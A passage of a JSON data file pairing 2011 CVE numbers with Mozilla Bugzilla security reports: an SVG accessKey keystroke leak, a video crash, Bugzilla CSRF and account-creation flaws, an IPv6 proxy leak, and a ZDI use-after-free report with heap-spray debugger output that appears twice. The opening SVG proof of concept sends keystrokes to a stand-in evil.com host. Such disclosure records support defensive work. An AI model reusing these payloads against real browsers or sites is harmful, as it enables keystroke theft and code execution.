attributeName=\"xlink:href\" begin=\"accessKey(c)\" to=\"//evil.com/?c\" /> <set attributeName=\"xlink:href\" begin=\"accessKey(d)\" to=\"//evil.com/?d\" /> </image> </svg> An MPEG video was made available as well to show the effect: http://www.twitvid.com/ICOMS Actual results: The attached test-case allows an attacker to send keystroke information to an arbitrary domain. Note: here we use //evil.com - you might want to change the PoC before testing to avoid referrer leakage. The issue was tested on various Firefox versions including 7.0.1, 8 and 11.0a1 (latest nightly) both Win7 and Ubuntu. All tested versions showed the described behavior. The problem occurs as well in case the user has JavaScript deactivated / uses NoScript. NoScript author Giorgio Maone was informed about the bug. Expected results: The access key listener should not listen on for keystrokes on document - or any given element on the loaded document. If necessary at all, the listener should work for the enclosing element, or the SVG -- but not leak to the rest of the document enclosing the SVG. Firefox / Gecko-browsers are the only user agents showing this behavior (so far). Chrome and Opera do not leak the stroke listener to the whole document, IE doesn't support <set> and <animate>."
      }
    ],
    "CVE-2011-3665": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=701259",
        "title": "crashes on videos when scaling to large width/height",
        "description": "when visiting the website: <video width=\"999999999\" height=\"999999999\" controls autoplay> <source src=\"avideo.ogg\" type=\"video/ogg\"> </video><video controls autoplay> firefox crashes in LinearScaleYUVToRGB32Row, an inline assembly function defined in gfx/ycbcr/yuv_row_posix.cpp it looks like firefox is writing xmm1 to rgb_buf width times but width is too big so it writes xmm1 until it reaches unmapped memory and crashes then I tested in firefox 5 on 32-bit linux and firefox 11 on 64-bit linux and it crashes as described above. I also tested in firefox 3.6 and it doesn't crash marking as security because possibly exploitable memory corruption"
      }
    ],
    "CVE-2011-3666": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=704622",
        "title": "[1.9.2] .jar should not be openable on Mac or Linux, download only (CVE-2011-3666)",
        "description": "+++ This bug was initially created as a clone of Bug #663899 +++ +++ This bug was initially created as a clone of Bug #662309 +++ A patch was landed for this in 1.9.23, but it did not fix the problem on the 1.9.2 branch. See bug 663899 comment 85"
      }
    ],
    "CVE-2011-3667": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=711714",
        "title": "[SECURITY] The User.offer_account_by_email WebService method lets you create new user accounts independently of the value of Bugzilla::Auth::Verify::*::user_can_create_account",
        "description": "createaccount.cgi rejects new account requests when $user->authorizer->user_can_create_account is false. But when calling User.offer_account_by_email, an email is sent in all cases to the user, and the link in the email let's you create a new account independently of what user_can_create_account is set to. Depending on how the authentication method is set, having an account in the DB may be enough to log in. For e.g. LDAP or RADIUS, I doubt this is exploitable, because the validation would fail (having an account in the DB doesn't mean they will recognize you). But with custom authentication methods where there is an external validator which only accepts to insert new accounts in the DB under some circumstances, I think this is exploitable. I think that User.offer_account_by_email should check what user_can_create_account is set to, and if set to false, no email should be sent. And maybe token.cgi should also reject the new account request if this setting is false, in case the email has been sent before account creation has been disabled. User.offer_account_by_email exists since Bugzilla 2.23.3, see bug 350232."
      }
    ],
    "CVE-2011-3668": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=703975",
        "title": "CSRF vulnerability in post_bug.cgi allows possible unauthorized bug creation",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.121 Safari/535.2 Steps to reproduce: Hello Mozilla Security Team There is a CSRF vulnerability in the page to send bugs in Bugzilla. When the value \"token\" is not sent on a \"REQUEST\" bugzilla does not process correctly, allowing the creation of the bug, with the simple interaction of the User to open a specially crafted page. Reproduce: 1. Log in Bugzilla 2. Open repro.html 2. See your bug created Regards, Mario Actual results: The server does not process correctly bugzilla REQUEST and allows for the creation of the exploration bug. Expected results: The creation of User BUG without knowing it."
      }
    ],
    "CVE-2011-3669": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=703983",
        "title": "CSRF vulnerability in attachment.cgi allows possible unauthorized attachment creation",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.121 Safari/535.2 Steps to reproduce: Hi, all tests done in https://landfill.bugzilla.org/bugzilla-tip/show_bug.cgi?id=16552. A vulnerability exists in the upload page bugzilla when a request is made and the value of \"token\" is not sent to the Bugzilla server, an error occurs allowing XSRF attacker to induce a victim to upload a file in a bug reported, without him knowing. Actual results: Upload the file Expected results: The file is upload"
      }
    ],
    "CVE-2011-3670": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=504014",
        "title": "Requests using IPv6 hostname syntax through HTTP proxies may generate errors",
        "description": "User-Agent: Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.9.0.11) Gecko/2009060214 Firefox/3.0.11 Build Identifier: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.1pre) Gecko/20090713 Shiretoko/3.5.1pre In Firefox, it is possible to make requests using IPv6 syntax (http://[example.com]/) via XMLHttpRequest objects. If an HTTP proxy has been configured, the request will be handled by the proxy. Depending on the proxy implementation a number of possible errors may occur. For example, the proxy may not be prepared to handle the IPv6 syntax and will incorrectly parse the request leading to an error. Error messages from HTTP proxies often include sensitive network diagnostic information such as client IP addresses, internal hostnames, email addresses and possibly a copy of the HTTP request. Because http://example.com/ and http://[example.com]/ are same origin, the XMLHttpRequest object can be used to read this information from the response. A remote site may be able to construct such requests in order to reduce a user's privacy. Additionally, if a copy of the HTTP request is included in the error response, it may be possible to read cookies marked as HttpOnly in XSS situations. Reproducible: Always Steps to Reproduce: 1. Configure HTTP proxy 2. Visit listed URL 3. Run test Tested with squid-cache proxy (squid/3.0.STABLE16) with default configuration."
      }
    ],
    "CVE-2011-3671": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=739343",
        "title": "Use After Free in nsHTMLSelectElement (ZDI-CAN-1301)",
        "description": "ZDI-CAN-1301: Mozilla Firefox nsHTMLSelectElement Remote Code Execution Vulnerability -- CVSS ----------------------------------------- 7.5, AV:N/AC:L/Au:N/C:P/I:P/A:P -- ABSTRACT ------------------------------------- TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox -- VULNERABILITY DETAILS ------------------------ Version(s) tested: Mozilla Firefox v4.0 Platform(s) tested: XP SP3 Object is used after free. A vtable pointer within the object is referenced at 1043781c (mov eax, dword ptr [edx+44h]) and the value fetched from the table is jumped to at 1043781f (call eax). Code surrounding vulnerability: 10437812 7408 je xul!nsINode::ReplaceOrInsertBefore+0x39820c (1043781c) 10437814 8b4250 mov eax,dword ptr [edx+50h] 10437817 53 push ebx 10437818 ffd0 call eax 1043781a eb05 jmp xul!nsINode::ReplaceOrInsertBefore+0x398211 (10437821) 1043781c 8b4244 mov eax,dword ptr [edx+44h] ds:0023:41414185=???????? //vulnerable deref 1043781f ffd0 call eax //call to vulnerable deref With heap spray, EIP is controlled: (374.518): Access violation - code c0000005 (!!! second chance !!!) eax=0c0c0c0c ebx=00000000 ecx=0426a600 edx=0c0c0c0c esi=0426a600 edi=043e1940 eip=0c0c0c0c esp=0012cbb0 ebp=00000001 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200246 0c0c0c0c 0c0c or al,0Ch 0:000> k ChildEBP RetAddr WARNING: Frame IP not in any known module. Following frames may be wrong. 0012cbac 10437821 0xc0c0c0c 0012cbdc 1010ca1a xul!nsINode::ReplaceOrInsertBefore+0x398211 0012cc48 1055eb86 xul!nsCOMPtr_base::assign_from_qi+0x2a [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\obj-firefox\\xpcom\\build\\nscomptr.cpp 98] 0012cc50 1057a744 xul!nsCOMPtr<nsIDOMHTMLOptionElement>::nsCOMPtr<nsIDOMHTMLOptionElement>+0x18 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\obj-firefox\\dist\\include\\nscomptr.h 596] 0012cc74 10962eb5 xul!nsHTMLOptionCollection::Add+0x8c [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\content\\html\\content\\src\\nshtmlselectelement.cpp 2286] 0012ccac 00535221 xul!nsIDOMNSHTMLOptionCollection_Add+0xf2 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\obj-firefox\\js\\src\\xpconnect\\src\\dom_quickstubs.cpp 20899] 0012d288 0052cb31 mozjs!js::Interpret+0x6331 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\js\\src\\jsinterp.cpp 4801] 0012d2bc 0052cf51 mozjs!js::RunScript+0xb1 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\js\\src\\jsinterp.cpp 653] 0012d314 0052d72c mozjs!js::Invoke+0x3b1 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\js\\src\\jsinterp.cpp 740] 0012d350 004ed4cf mozjs!js::ExternalInvoke+0x1dc [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\js\\src\\jsinterp.cpp 863] 0012d384 10176229 mozjs!JS_CallFunctionValue+0x4f [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\js\\src\\jsapi.cpp 5174] 0012d44c 10192a2b xul!nsJSContext::CallEventHandler+0x2b9 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\dom\\base\\nsjsenvironment.cpp 1915] 0012d548 101a4ca2 xul!nsJSEventListener::HandleEvent+0x11b [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\dom\\src\\events\\nsjseventlistener.cpp 230] 0012d634 1013acbe xul!nsEventListenerManager::HandleEventSubType+0x36 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\content\\events\\src\\nseventlistenermanager.cpp 1127] 0012d688 10125c72 xul!nsEventListenerManager::HandleEventInternal+0x2ce [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\content\\events\\src\\nseventlistenermanager.cpp 1224] 0012d6d4 1010ad14 xul!nsEventTargetChainItem::HandleEventTargetChain+0x2d2 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\content\\events\\src\\nseventdispatcher.cpp 341] 0012d774 101a57d0 xul!nsEventDispatcher::Dispatch+0x484 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\content\\events\\src\\nseventdispatcher.cpp 632] 0012d7ec 101a5997 xul!DocumentViewerImpl::LoadComplete+0x109 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\layout\\base\\nsdocumentviewer.cpp 1055] 0012d9d8 10095a63 xul!nsDocShell::EndPageLoad+0xbd [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\docshell\\base\\nsdocshell.cpp 6087] 0012da28 100c9413 xul!nsDocShell::OnStateChange+0xc5 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\docshell\\base\\nsdocshell.cpp 5938] 0012da6c 10024d53 xul!nsDocLoader::FireOnStateChange+0x133 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\uriloader\\base\\nsdocloader.cpp 1334] 0012da80 10195e5b xul!nsDocLoader::doStopDocumentLoad+0x1c [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\uriloader\\base\\nsdocloader.cpp 953] 00000000 00000000 xul!nsDocLoader::DocLoaderIsEmpty+0x1cb [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\uriloader\\base\\nsdocloader.cpp @ 820] With heap spray removed: eax=06860800 ebx=00000000 ecx=06913300 edx=41414141 esi=06913300 edi=07f7a7c0 eip=1043781c esp=0012cbb4 ebp=00000001 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00210246 xul!nsINode::ReplaceOrInsertBefore+0x39820c: 1043781c 8b4244 mov eax,dword ptr [edx+44h] ds:0023:41414185=???????? 0:000> k ChildEBP RetAddr 0012cbdc 1010ca1a xul!nsINode::ReplaceOrInsertBefore+0x39820c 0012cc48 1055eb86 xul!nsCOMPtr_base::assign_from_qi+0x2a [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\obj-firefox\\xpcom\\build\\nscomptr.cpp 98] 0012cc50 1057a744 xul!nsCOMPtr<nsIDOMHTMLOptionElement>::nsCOMPtr<nsIDOMHTMLOptionElement>+0x18 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\obj-firefox\\dist\\include\\nscomptr.h 596] 0012cc74 10962eb5 xul!nsHTMLOptionCollection::Add+0x8c [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\content\\html\\content\\src\\nshtmlselectelement.cpp 2286] 0012ccac 01695221 xul!nsIDOMNSHTMLOptionCollection_Add+0xf2 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\obj-firefox\\js\\src\\xpconnect\\src\\dom_quickstubs.cpp 20899] 0012d288 0168cb31 mozjs!js::Interpret+0x6331 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\js\\src\\jsinterp.cpp 4801] 0012d2bc 0168cf51 mozjs!js::RunScript+0xb1 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\js\\src\\jsinterp.cpp 653] 0012d314 0168d72c mozjs!js::Invoke+0x3b1 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\js\\src\\jsinterp.cpp 740] 0012d350 0164d4cf mozjs!js::ExternalInvoke+0x1dc [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\js\\src\\jsinterp.cpp 863] 0012d384 10176229 mozjs!JS_CallFunctionValue+0x4f [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\js\\src\\jsapi.cpp 5174] 0012d44c 10192a2b xul!nsJSContext::CallEventHandler+0x2b9 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\dom\\base\\nsjsenvironment.cpp 1915] 0012d548 101a4ca2 xul!nsJSEventListener::HandleEvent+0x11b [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\dom\\src\\events\\nsjseventlistener.cpp 230] 0012d634 1013acbe xul!nsEventListenerManager::HandleEventSubType+0x36 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\content\\events\\src\\nseventlistenermanager.cpp 1127] 0012d688 10125c72 xul!nsEventListenerManager::HandleEventInternal+0x2ce [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\content\\events\\src\\nseventlistenermanager.cpp 1224] 0012d6d4 1010ad14 xul!nsEventTargetChainItem::HandleEventTargetChain+0x2d2 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\content\\events\\src\\nseventdispatcher.cpp 341] 0012d774 101a57d0 xul!nsEventDispatcher::Dispatch+0x484 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\content\\events\\src\\nseventdispatcher.cpp 632] 0012d7ec 101a5997 xul!DocumentViewerImpl::LoadComplete+0x109 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\layout\\base\\nsdocumentviewer.cpp 1055] 0012d9d8 10095a63 xul!nsDocShell::EndPageLoad+0xbd [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\docshell\\base\\nsdocshell.cpp 6087] 0012da28 100c9413 xul!nsDocShell::OnStateChange+0xc5 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\docshell\\base\\nsdocshell.cpp 5938] 0012da6c 10024d53 xul!nsDocLoader::FireOnStateChange+0x133 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\uriloader\\base\\nsdocloader.cpp 1334] 0012da80 10195e5b xul!nsDocLoader::doStopDocumentLoad+0x1c [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\uriloader\\base\\nsdocloader.cpp 953] 00000000 00000000 xul!nsDocLoader::DocLoaderIsEmpty+0x1cb [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\uriloader\\base\\nsdocloader.cpp @ 820] -- CREDIT --------------------------------------- This vulnerability was discovered by: regenrecht -- FURTHER DETAILS ------------------------------ If supporting files were contained with this report they are provided within a password protected ZIP file. The password is the ZDI candidate number in the form: ZDI-CAN-XXXX where XXXX is the ID number. Please confirm receipt of this report. We expect all vendors to remediate ZDI vulnerabilities within 180 days of the reported date. If you are ready to release a patch at any point leading up the the deadline please coordinate with us so that we may release our advisory detailing the issue. If the 180 day deadline is reached and no patch has been made available we will release a limited public advisory with our own mitigations so that the public can protect themselves in the absence of a patch. Please keep us updated regarding the status of this issue and feel free to contact us at any time: Derek Brown Security Liaison Zero Day Initiative zdi-disclosures@tippingpoint.com The PGP key used for all ZDI vendor communications is available from: http://www.zerodayinitiative.com/documents/zdi-pgp-key.asc -- INFORMATION ABOUT THE ZDI --------------------- Established by TippingPoint, The Zero Day Initiative (ZDI) represents a best-of-breed model for rewarding security researchers for responsibly disclosing discovered vulnerabilities. The ZDI is unique in how the acquired vulnerability information is used. TippingPoint does not re-sell the vulnerability details or any exploit code. Instead, upon notifying the affected product vendor, TippingPoint provides its customers with zero day protection through its intrusion prevention technology. Explicit details regarding the specifics of the vulnerability are not exposed to any parties until an official vendor patch is publicly available. Furthermore, with the altruistic aim of helping to secure a broader user base, TippingPoint provides this vulnerability information confidentially to security vendors (including competitors) who have a vulnerability protection or mitigation product. Please contact us for further information or refer to: http://www.zerodayinitiative.com -- DISCLOSURE POLICY ---------------------------- Our vulnerability disclosure policy is available online at: http://www.zerodayinitiative.com/advisories/disclosure_policy/"
      }
    ],
    "CVE-2011-3866": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=682562",
        "description": "ZDI-CAN-1301: Mozilla Firefox nsHTMLSelectElement Remote Code Execution Vulnerability -- CVSS ----------------------------------------- 7.5, AV:N/AC:L/Au:N/C:P/I:P/A:P -- ABSTRACT ------------------------------------- TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox -- VULNERABILITY DETAILS ------------------------ Version(s) tested: Mozilla Firefox v4.0 Platform(s) tested: XP SP3 Object is used after free. A vtable pointer within the object is referenced at 1043781c (mov eax, dword ptr [edx+44h]) and the value fetched from the table is jumped to at 1043781f (call eax). Code surrounding vulnerability: 10437812 7408 je xul!nsINode::ReplaceOrInsertBefore+0x39820c (1043781c) 10437814 8b4250 mov eax,dword ptr [edx+50h] 10437817 53 push ebx 10437818 ffd0 call eax 1043781a eb05 jmp xul!nsINode::ReplaceOrInsertBefore+0x398211 (10437821) 1043781c 8b4244 mov eax,dword ptr [edx+44h] ds:0023:41414185=???????? //vulnerable deref 1043781f ffd0 call eax //call to vulnerable deref With heap spray, EIP is controlled: (374.518): Access violation - code c0000005 (!!! second chance !!!) eax=0c0c0c0c ebx=00000000 ecx=0426a600 edx=0c0c0c0c esi=0426a600 edi=043e1940 eip=0c0c0c0c esp=0012cbb0 ebp=00000001 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00200246 0c0c0c0c 0c0c or al,0Ch 0:000> k ChildEBP RetAddr WARNING: Frame IP not in any known module. Following frames may be wrong. 0012cbac 10437821 0xc0c0c0c 0012cbdc 1010ca1a xul!nsINode::ReplaceOrInsertBefore+0x398211 0012cc48 1055eb86 xul!nsCOMPtr_base::assign_from_qi+0x2a [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\obj-firefox\\xpcom\\build\\nscomptr.cpp 98] 0012cc50 1057a744 xul!nsCOMPtr<nsIDOMHTMLOptionElement>::nsCOMPtr<nsIDOMHTMLOptionElement>+0x18 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\obj-firefox\\dist\\include\\nscomptr.h 596] 0012cc74 10962eb5 xul!nsHTMLOptionCollection::Add+0x8c [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\content\\html\\content\\src\\nshtmlselectelement.cpp 2286] 0012ccac 00535221 xul!nsIDOMNSHTMLOptionCollection_Add+0xf2 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\obj-firefox\\js\\src\\xpconnect\\src\\dom_quickstubs.cpp 20899] 0012d288 0052cb31 mozjs!js::Interpret+0x6331 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\js\\src\\jsinterp.cpp 4801] 0012d2bc 0052cf51 mozjs!js::RunScript+0xb1 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\js\\src\\jsinterp.cpp 653] 0012d314 0052d72c mozjs!js::Invoke+0x3b1 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\js\\src\\jsinterp.cpp 740] 0012d350 004ed4cf mozjs!js::ExternalInvoke+0x1dc [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\js\\src\\jsinterp.cpp 863] 0012d384 10176229 mozjs!JS_CallFunctionValue+0x4f [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\js\\src\\jsapi.cpp 5174] 0012d44c 10192a2b xul!nsJSContext::CallEventHandler+0x2b9 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\dom\\base\\nsjsenvironment.cpp 1915] 0012d548 101a4ca2 xul!nsJSEventListener::HandleEvent+0x11b [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\dom\\src\\events\\nsjseventlistener.cpp 230] 0012d634 1013acbe xul!nsEventListenerManager::HandleEventSubType+0x36 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\content\\events\\src\\nseventlistenermanager.cpp 1127] 0012d688 10125c72 xul!nsEventListenerManager::HandleEventInternal+0x2ce [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\content\\events\\src\\nseventlistenermanager.cpp 1224] 0012d6d4 1010ad14 xul!nsEventTargetChainItem::HandleEventTargetChain+0x2d2 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\content\\events\\src\\nseventdispatcher.cpp 341] 0012d774 101a57d0 xul!nsEventDispatcher::Dispatch+0x484 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\content\\events\\src\\nseventdispatcher.cpp 632] 0012d7ec 101a5997 xul!DocumentViewerImpl::LoadComplete+0x109 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\layout\\base\\nsdocumentviewer.cpp 1055] 0012d9d8 10095a63 xul!nsDocShell::EndPageLoad+0xbd [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\docshell\\base\\nsdocshell.cpp 6087] 0012da28 100c9413 xul!nsDocShell::OnStateChange+0xc5 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\docshell\\base\\nsdocshell.cpp 5938] 0012da6c 10024d53 xul!nsDocLoader::FireOnStateChange+0x133 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\uriloader\\base\\nsdocloader.cpp 1334] 0012da80 10195e5b xul!nsDocLoader::doStopDocumentLoad+0x1c [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\uriloader\\base\\nsdocloader.cpp 953] 00000000 00000000 xul!nsDocLoader::DocLoaderIsEmpty+0x1cb [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\uriloader\\base\\nsdocloader.cpp @ 820] With heap spray removed: eax=06860800 ebx=00000000 ecx=06913300 edx=41414141 esi=06913300 edi=07f7a7c0 eip=1043781c esp=0012cbb4 ebp=00000001 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00210246 xul!nsINode::ReplaceOrInsertBefore+0x39820c: 1043781c 8b4244 mov eax,dword ptr [edx+44h] ds:0023:41414185=???????? 0:000> k ChildEBP RetAddr 0012cbdc 1010ca1a xul!nsINode::ReplaceOrInsertBefore+0x39820c 0012cc48 1055eb86 xul!nsCOMPtr_base::assign_from_qi+0x2a [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\obj-firefox\\xpcom\\build\\nscomptr.cpp 98] 0012cc50 1057a744 xul!nsCOMPtr<nsIDOMHTMLOptionElement>::nsCOMPtr<nsIDOMHTMLOptionElement>+0x18 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\obj-firefox\\dist\\include\\nscomptr.h 596] 0012cc74 10962eb5 xul!nsHTMLOptionCollection::Add+0x8c [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\content\\html\\content\\src\\nshtmlselectelement.cpp 2286] 0012ccac 01695221 xul!nsIDOMNSHTMLOptionCollection_Add+0xf2 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\obj-firefox\\js\\src\\xpconnect\\src\\dom_quickstubs.cpp 20899] 0012d288 0168cb31 mozjs!js::Interpret+0x6331 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\js\\src\\jsinterp.cpp 4801] 0012d2bc 0168cf51 mozjs!js::RunScript+0xb1 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\js\\src\\jsinterp.cpp 653] 0012d314 0168d72c mozjs!js::Invoke+0x3b1 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\js\\src\\jsinterp.cpp 740] 0012d350 0164d4cf mozjs!js::ExternalInvoke+0x1dc [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\js\\src\\jsinterp.cpp 863] 0012d384 10176229 mozjs!JS_CallFunctionValue+0x4f [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\js\\src\\jsapi.cpp 5174] 0012d44c 10192a2b xul!nsJSContext::CallEventHandler+0x2b9 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\dom\\base\\nsjsenvironment.cpp 1915] 0012d548 101a4ca2 xul!nsJSEventListener::HandleEvent+0x11b [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\dom\\src\\events\\nsjseventlistener.cpp 230] 0012d634 1013acbe xul!nsEventListenerManager::HandleEventSubType+0x36 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\content\\events\\src\\nseventlistenermanager.cpp 1127] 0012d688 10125c72 xul!nsEventListenerManager::HandleEventInternal+0x2ce [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\content\\events\\src\\nseventlistenermanager.cpp 1224] 0012d6d4 1010ad14 xul!nsEventTargetChainItem::HandleEventTargetChain+0x2d2 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\content\\events\\src\\nseventdispatcher.cpp 341] 0012d774 101a57d0 xul!nsEventDispatcher::Dispatch+0x484 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\content\\events\\src\\nseventdispatcher.cpp 632] 0012d7ec 101a5997 xul!DocumentViewerImpl::LoadComplete+0x109 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\layout\\base\\nsdocumentviewer.cpp 1055] 0012d9d8 10095a63 xul!nsDocShell::EndPageLoad+0xbd [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\docshell\\base\\nsdocshell.cpp 6087] 0012da28 100c9413 xul!nsDocShell::OnStateChange+0xc5 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\docshell\\base\\nsdocshell.cpp 5938] 0012da6c 10024d53 xul!nsDocLoader::FireOnStateChange+0x133 [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\uriloader\\base\\nsdocloader.cpp 1334] 0012da80 10195e5b xul!nsDocLoader::doStopDocumentLoad+0x1c [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\uriloader\\base\\nsdocloader.cpp 953] 00000000 00000000 xul!nsDocLoader::DocLoaderIsEmpty+0x1cb [e:\\builds\\moz2_slave\\rel-2.0-w32-bld\\build\\uriloader\\base\\nsdocloader.cpp @ 820] -- CREDIT --------------------------------------- This vulnerability was discovered by: regenrecht -- FURTHER DETAILS ------------------------------ If supporting files were contained with this report they are provided within a password protected ZIP file. The password is the ZDI candidate number in the form: ZDI-CAN-XXXX where XXXX is the ID number. Please confirm receipt of this report. We expect all vendors to remediate ZDI vulnerabilities within 180 days of the reported date. If you are ready to release a patch at any point leading up the the deadline please coordinate with us so that we may release our advisory detailing the issue. If the 180 day deadline is reached and no patch has been made available we will release a limited public advisory with our own mitigations so that the public can protect themselves in the absence of a patch. Please keep us updated regarding the status of this issue and feel free to contact us at any time: Derek Brown Security Liaison Zero Day Initiative zdi-disclosures@tippingpoint.com The PGP key used for all ZDI vendor communications is available from: http://www.zerodayinitiative.com/documents/zdi-pgp-key.asc -- INFORMATION ABOUT THE ZDI --------------------- Established by TippingPoint, The Zero Day Initiative (ZDI) represents a best-of-breed model for rewarding security researchers for responsibly disclosing discovered vulnerabilities. The ZDI is unique in how the acquired vulnerability information is used. TippingPoint does not re-sell the vulnerability details or any exploit code. Instead, upon notifying the affected product vendor, TippingPoint provides its customers with zero day protection through its intrusion prevention technology. Explicit details regarding the specifics of the vulnerability are not exposed to any parties until an official vendor patch is publicly available. Furthermore, with the altruistic aim of helping to secure a broader user base, TippingPoint provides this vulnerability information confidentially to security vendors (including competitors) who have a vulnerability protection or mitigation product. Please contact us for further information or refer to: http://www.zerodayinitiative.com -- DISCLOSURE POLICY ---------------------------- Our vulnerability disclosure policy is available online at: http://www.zerodayinitiative.com/advisories/disclosure_policy/"
      }
    ]
  }
}